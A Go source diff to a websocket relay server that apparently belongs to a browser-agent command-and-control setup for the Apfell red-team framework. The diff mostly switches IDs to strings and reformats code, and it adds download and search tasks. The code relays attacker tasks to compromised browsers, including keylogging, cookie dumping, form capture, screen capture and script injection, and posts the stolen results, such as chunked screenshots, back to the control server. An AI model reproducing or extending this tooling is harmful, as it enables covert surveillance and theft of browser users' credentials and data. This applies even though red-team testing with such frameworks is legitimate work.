@@ -5,7 +5,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/gorilla/websocket"
 	"log"
 	"math"
 	"math/rand"
@@ -13,6 +12,8 @@ import (
 	"net/http"
 	"strings"
 	"time"
+
+	"github.com/gorilla/websocket"
 )
 
 var conn net.Conn
@@ -22,14 +23,13 @@ var checkedIn bool
 var apfellID int
 var uniqueID string
 
-
 type client struct {
-	ApfellID int
+	ApfellID  string
 	CheckedIn bool
 }
 
 type metamsg struct {
-	MetaType int `json:"metatype"`
+	MetaType int             `json:"metatype"`
 	MetaData json.RawMessage `json:"metadata"`
 }
 
@@ -39,7 +39,7 @@ type checkinmeta struct {
 }
 
 type checkInMsgData struct {
-	ApfellID int    `json:"apfellid,omitempty"`
+	ApfellID string `json:"apfellid,omitempty"`
 	Hostname string `json:"host,omitempty"`
 	IP       string `json:"ip,omitempty"`
 	PID      int    `json:"pid,omitempty"`
@@ -54,22 +54,22 @@ type apfellmeta struct {
 
 type apfellMsgData struct {
 	Type     int    `json:"type,omitempty"`
-	ApfellID int    `json:"id,omitempty"`
+	ApfellID string `json:"id,omitempty"`
 	UUID     string `json:"uuid,omitempty"`
 	Size     int    `json:"size,omitempty"`
-	TaskID   int    `json:"taskid,omitempty"`
+	TaskID   string `json:"taskid,omitempty"`
 	TaskType int    `json:"tasktype,omitempty"`
-	TaskName string  `json:"taskname,omitempty"`
+	TaskName string `json:"taskname,omitempty"`
 	Data     string `json:"data,omitempty"`
 }
 
 type initmeta struct {
-	MetaType int `json:"metatype"`
+	MetaType int         `json:"metatype"`
 	MetaData initMsgData `json:"metadata"`
 }
 
 type initMsgData struct {
-	Stage int `json:"stage"`
+	Stage int    `json:"stage"`
 	KeyID string `json:"keyid"`
 }
 
@@ -106,7 +106,7 @@ func createInitMessage(stage int, keyID string) []byte {
 	return dataToSend
 }
 
-func createCheckinMessage(apfellid int) interface{} {
+func createCheckinMessage(apfellid string) interface{} {
 	msg := &checkinmeta{}
 
 	msg.MetaData.ApfellID = apfellid
@@ -116,7 +116,7 @@ func createCheckinMessage(apfellid int) interface{} {
 	return msg
 }
 
-func createApfellMessage(apfellMsgType int, callbackid int, uid string, size int, taskid int, apfellTaskType int, apfellTaskname string, rawData []byte) interface{} {
+func createApfellMessage(apfellMsgType int, callbackid string, uid string, size int, taskid string, apfellTaskType int, apfellTaskname string, rawData []byte) interface{} {
 
 	msg := apfellmeta{}
 
@@ -134,8 +134,7 @@ func createApfellMessage(apfellMsgType int, callbackid int, uid string, size int
 	return msg
 }
 
-
-func socketHandler(w http.ResponseWriter, r *http.Request)  {
+func socketHandler(w http.ResponseWriter, r *http.Request) {
 	// Upgrade to a websocket connection
 	upgrader.CheckOrigin = func(r *http.Request) bool { return true }
 	conn, err := upgrader.Upgrade(w, r, nil)
@@ -148,85 +147,86 @@ func socketHandler(w http.ResponseWriter, r *http.Request)  {
 	c := make(chan interface{})
 	clID := String(8)
 
-
 	ravenlog("Handling new websocket connection")
 	go manageApfell(conn, clID, c)
 	go manageClient(conn, clID, c)
 
-
 }
 
 func manageApfell(c *websocket.Conn, clid string, newtask chan interface{}) {
-	defer func() {_ = c.Close()}()
+	defer func() { _ = c.Close() }()
 
 	tasktypes := map[string]int{
 		"screencapture": 1,
 		"keylog":        2,
-		"cookiedump":	 3,
-		"cookieset":	 4,
+		"cookiedump":    3,
+		"cookieset":     4,
 		"cookieremove":  5,
-		"tabs":		 	 6,
-		"userinfo":		 7,
+		"tabs":          6,
+		"userinfo":      7,
 		"formcapture":   8,
-		"prompt"	 :   9,
-		"inject":		 10,
+		"prompt":        9,
+		"inject":        10,
 		"none":          11,
-		"exit":			 12,
+		"exit":          12,
+		"download":      13,
+		"opendownload":  14,
+		"search":        15,
 	}
 
 	time.Sleep(time.Duration(cf.Interval) * time.Second)
-	LOOP:
-		for {
-			if agent, ok := clients[clid]; ok {
-				if agent.CheckedIn == true {
-					endpoint := fmt.Sprintf("tasks/callback/%d/nextTask", agent.ApfellID)
-					resp := apfellRequest(endpoint, nil, "GET")
+LOOP:
+	for {
+		if agent, ok := clients[clid]; ok {
+			if agent.CheckedIn == true {
+				endpoint := fmt.Sprintf("tasks/callback/%s/nextTask", agent.ApfellID)
+				resp := apfellRequest(endpoint, nil, "GET")
 
-					if len(resp) != 0 {
-						nextTask := task{}
-						err := json.Unmarshal(resp, &nextTask)
-						if err != nil {
-							log.Println("Unable to unmarshal apfell packet:", err)
+				if len(resp) != 0 {
+					nextTask := task{}
+					err := json.Unmarshal(resp, &nextTask)
+					if err != nil {
+						log.Println("Unable to unmarshal apfell packet:", err)
+						break
+					}
+
+					ravenlog(fmt.Sprintf("apfell response: %s", string(resp)))
+					taskType, ok := tasktypes[nextTask.Command]
+
+					if ok {
+						switch taskType {
+						case 11:
+							ravenlog("Task command is none")
 							break
-						}
 
-						ravenlog(fmt.Sprintf("apfell response: %s", string(resp)))
-						taskType, ok := tasktypes[nextTask.Command]
+						case 12:
+							size := len(nextTask.Params)
+							ravenlog("Tasked to exit the callback")
+							meta := createApfellMessage(2, clients[clid].ApfellID, uniqueID, size, nextTask.TaskID, taskType, nextTask.Command, []byte(nextTask.Params))
+							ravenlog("Sending new task to client")
+							ravenlog(fmt.Sprintf("task: %+v\n", meta))
+							newtask <- meta
+							break LOOP
+						default:
+							size := len(nextTask.Params)
+							meta := createApfellMessage(2, clients[clid].ApfellID, uniqueID, size, nextTask.TaskID, taskType, nextTask.Command, []byte(nextTask.Params))
+							//msg := base64.StdEncoding.EncodeToString(meta)
+							ravenlog("Sending new task to client")
 
-						if ok {
-							switch taskType {
-							case 11:
-								ravenlog("Task command is none")
-								break
-
-							case 12:
-								size := len(nextTask.Params)
-								ravenlog("Tasked to exit the callback")
-								meta := createApfellMessage(2, clients[clid].ApfellID, uniqueID, size, nextTask.TaskID, taskType, nextTask.Command, []byte(nextTask.Params))
-								ravenlog("Sending new task to client")
-								ravenlog(fmt.Sprintf("task: %+v\n", meta))
-								newtask<- meta
-								break LOOP
-							default:
-								size := len(nextTask.Params)
-								meta := createApfellMessage(2, clients[clid].ApfellID, uniqueID, size, nextTask.TaskID, taskType, nextTask.Command, []byte(nextTask.Params))
-								//msg := base64.StdEncoding.EncodeToString(meta)
-								ravenlog("Sending new task to client")
-
-								ravenlog(fmt.Sprintf("task: %+v\n", meta))
-								newtask<- meta
-								break
-							}
+							ravenlog(fmt.Sprintf("task: %+v\n", meta))
+							newtask <- meta
+							break
 						}
 					}
 				}
 			}
-			time.Sleep(time.Duration(cf.Interval) * time.Second)
+		}
+		time.Sleep(time.Duration(cf.Interval) * time.Second)
 	}
 }
 
-func manageClient(c *websocket.Conn, clid string, newtask chan interface{}){
-	defer func() {_ = c.Close()}()
+func manageClient(c *websocket.Conn, clid string, newtask chan interface{}) {
+	defer func() { _ = c.Close() }()
 
 	for {
 		newMsg := metamsg{}
@@ -273,7 +273,6 @@ func manageClient(c *websocket.Conn, clid string, newtask chan interface{}){
 				r := standardApfellCheckinResponse{}
 				_ = json.Unmarshal(resp, &r)
 
-
 				if strings.Contains(r.Status, "success") {
 					clients[clid] = &client{r.ID, true}
 					msg := createCheckinMessage(r.ID)
@@ -303,7 +302,7 @@ func manageClient(c *websocket.Conn, clid string, newtask chan interface{}){
 					// Handle screenshots
 					rawImage, _ := base64.StdEncoding.DecodeString(aData.Data)
 					size := len(rawImage)
-					const fileChunk= 512000 //Normal apfell chunk size
+					const fileChunk = 512000 //Normal apfell chunk size
 					chunks := uint64(math.Ceil(float64(size) / fileChunk))
 
 					fileResponse := taskResponse{}
@@ -315,7 +314,7 @@ func manageClient(c *websocket.Conn, clid string, newtask chan interface{}){
 					encodedmsg := base64.StdEncoding.EncodeToString(msg)
 					fileResponse.Response = encodedmsg
 
-					endpoint := fmt.Sprintf("responses/%d", aData.TaskID)
+					endpoint := fmt.Sprintf("responses/%s", aData.TaskID)
 					dataToSend, _ := json.Marshal(fileResponse)
 
 					resp := apfellRequest(endpoint, dataToSend, "POST")
@@ -352,7 +351,7 @@ func manageClient(c *websocket.Conn, clid string, newtask chan interface{}){
 						ravenlog(fmt.Sprintf("Sending chunk %d , with id %d", apfellMsgData.ChunkNum, apfellMsgData.FileID))
 						msg, _ := json.Marshal(apfellMsgData)
 						apfellMsg.Response = base64.StdEncoding.EncodeToString(msg)
-						endpoint := fmt.Sprintf("responses/%d", aData.TaskID)
+						endpoint := fmt.Sprintf("responses/%s", aData.TaskID)
 						dataToSend, _ := json.Marshal(apfellMsg)
 						resp := apfellRequest(endpoint, dataToSend, "POST")
 
@@ -361,7 +360,7 @@ func manageClient(c *websocket.Conn, clid string, newtask chan interface{}){
 					}
 					finished := taskResponse{}
 					finished.Response = base64.StdEncoding.EncodeToString([]byte("download complete"))
-					endpoint = fmt.Sprintf("responses/%d", aData.TaskID)
+					endpoint = fmt.Sprintf("responses/%s", aData.TaskID)
 					dataToSend, _ = json.Marshal(finished)
 					_ = apfellRequest(endpoint, dataToSend, "POST")
 
@@ -371,14 +370,14 @@ func manageClient(c *websocket.Conn, clid string, newtask chan interface{}){
 					response := taskResponse{}
 					response.Response = aData.Data
 
-					endpoint := fmt.Sprintf("responses/%d", aData.TaskID)
+					endpoint := fmt.Sprintf("responses/%s", aData.TaskID)
 					dataToSend, _ := json.Marshal(response)
 
 					resp := apfellRequest(endpoint, dataToSend, "POST")
 					s := standardApfellResponse{}
 					err := json.Unmarshal(resp, &s)
 					if err != nil {
-						ravenlog(fmt.Sprintf("Unable to unmarshal apfell packet:", err))
+						ravenlog(fmt.Sprintf("Unable to unmarshal apfell packet: %s", err))
 						break
 					}
 
@@ -397,8 +396,5 @@ func manageClient(c *websocket.Conn, clid string, newtask chan interface{}){
 			clients[clid].CheckedIn = false
 		}
 
-
 	}
 }
-
-
